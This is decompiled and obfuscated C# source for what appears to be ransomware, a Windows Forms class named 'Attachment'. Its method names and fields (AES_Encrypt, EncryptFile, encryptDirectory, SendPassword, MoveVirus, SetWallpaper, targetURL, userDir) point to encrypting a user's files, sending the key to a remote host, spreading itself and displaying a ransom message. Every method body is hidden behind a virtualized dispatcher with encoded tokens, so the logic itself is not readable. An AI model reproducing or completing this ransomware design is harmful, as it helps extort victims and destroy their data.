using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Attachment;

public class Form1 : Form
{
	private string targetURL;

	private string userName;

	private string computerName;

	private string userDir;

	private string backgroundImageUrl;

	private IContainer components;

	protected unsafe override CreateParams CreateParams
	{
		get
		{
			void*[] array = new void*[1];
			TypedReference typedReference = __makeref(this);
			array[0] = &typedReference;
			CreateParams result = default(CreateParams);
			TypedReference typedReference2 = __makeref(result);
			((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("4ĺɬ\u033bбԾؿ\u0734\u0829ल\u0a31ଳ", array, &typedReference2);
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public unsafe Form1()
	{
		//IL_0025: Expected I, but got O
		void*[] array = new void*[1];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("<ĻȲ\u033cоԶذݣ\u0829ॡਰଵ", array, (void*)unchecked((nint)null));
	}

	public unsafe byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		void*[] array = new void*[3];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(bytesToBeEncrypted);
		array[1] = &typedReference2;
		TypedReference typedReference3 = __makeref(passwordBytes);
		array[2] = &typedReference3;
		byte[] result = default(byte[]);
		TypedReference typedReference4 = __makeref(result);
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("8ŮȾ\u033dмԿ٧\u0733\u0829षਸ਼\u0b31", array, &typedReference4);
		return result;
	}

	public unsafe string CreatePassword(int length)
	{
		void*[] array = new void*[2];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(length);
		array[1] = &typedReference2;
		string result = default(string);
		TypedReference typedReference3 = __makeref(result);
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("9Ůȹ\u033dпզرݣ\u0829ॠਸ਼ହ", array, &typedReference3);
		return result;
	}

	public unsafe void SendPassword(string password)
	{
		//IL_0033: Expected I, but got O
		void*[] array = new void*[2];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(password);
		array[1] = &typedReference2;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))(":ĽȻ\u036bѫԶ٥\u0736\u0829\u093b\u0a37ଷ", array, (void*)unchecked((nint)null));
	}

	public unsafe void EncryptFile(string file, string password)
	{
		//IL_0041: Expected I, but got O
		void*[] array = new void*[3];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(file);
		array[1] = &typedReference2;
		TypedReference typedReference3 = __makeref(password);
		array[2] = &typedReference3;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))(":ŨȻ\u033fмԷ٣\u0732\u0829व\u0a34ଵ", array, (void*)unchecked((nint)null));
	}

	public unsafe void encryptDirectory(string location, string password)
	{
		//IL_0041: Expected I, but got O
		void*[] array = new void*[3];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(location);
		array[1] = &typedReference2;
		TypedReference typedReference3 = __makeref(password);
		array[2] = &typedReference3;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("?ļȸ\u033eѮԿر\u0732\u0829॥ਵଳ", array, (void*)unchecked((nint)null));
	}

	public unsafe void MoveVirus()
	{
		//IL_0025: Expected I, but got O
		void*[] array = new void*[1];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("nůɩ\u033eлԱ٣ݧ\u0829ष\u0a3a\u0b31", array, (void*)unchecked((nint)null));
	}

	public unsafe static bool CheckForInternetConnection()
	{
		void*[] array = new void*[0];
		bool result = default(bool);
		TypedReference typedReference = __makeref(result);
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("jĽɩ\u033dѮԵط\u0731\u0829व\u0a3aହ", array, &typedReference);
		return result;
	}

	public unsafe void startAction()
	{
		//IL_0025: Expected I, but got O
		void*[] array = new void*[1];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("?Ľɨ\u033dѩԲضݣ\u0829ॠ\u0a3bଷ", array, (void*)unchecked((nint)null));
	}

	public unsafe void Directory_Settings_Sending(string password)
	{
		//IL_0033: Expected I, but got O
		void*[] array = new void*[2];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(password);
		array[1] = &typedReference2;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("8ľɪ\u0369Ѫլ٣\u0734ࠨशਲଲవ", array, (void*)unchecked((nint)null));
	}

	public unsafe void messageCreator()
	{
		//IL_0025: Expected I, but got O
		void*[] array = new void*[1];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("9ĿȾ\u033eмԺ٦ݧࠨलਲଳళ", array, (void*)unchecked((nint)null));
	}

	public unsafe void VoiceCreator()
	{
		//IL_0025: Expected I, but got O
		void*[] array = new void*[1];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("nůȽ\u033bбծذ\u0733ࠨलਲରఱ", array, (void*)unchecked((nint)null));
	}

	public unsafe void SetWallpaper(string path)
	{
		//IL_0033: Expected I, but got O
		void*[] array = new void*[2];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(path);
		array[1] = &typedReference2;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("?ĹȺ\u036fѬի٤ݠࠨ०ਲରహ", array, (void*)unchecked((nint)null));
	}

	protected unsafe override void Dispose(bool disposing)
	{
		//IL_0033: Expected I, but got O
		void*[] array = new void*[2];
		TypedReference typedReference = __makeref(this);
		array[0] = &typedReference;
		TypedReference typedReference2 = __makeref(disposing);
		array[1] = &typedReference2;
		((delegate*<string, void*[], void*, void>)(&_8492E2FB._67D0442A))("oĻȽ\u033aиծضݤࠨॠਲ\u0b31ష", array, (void*)unchecked((nint)null));
	}
}
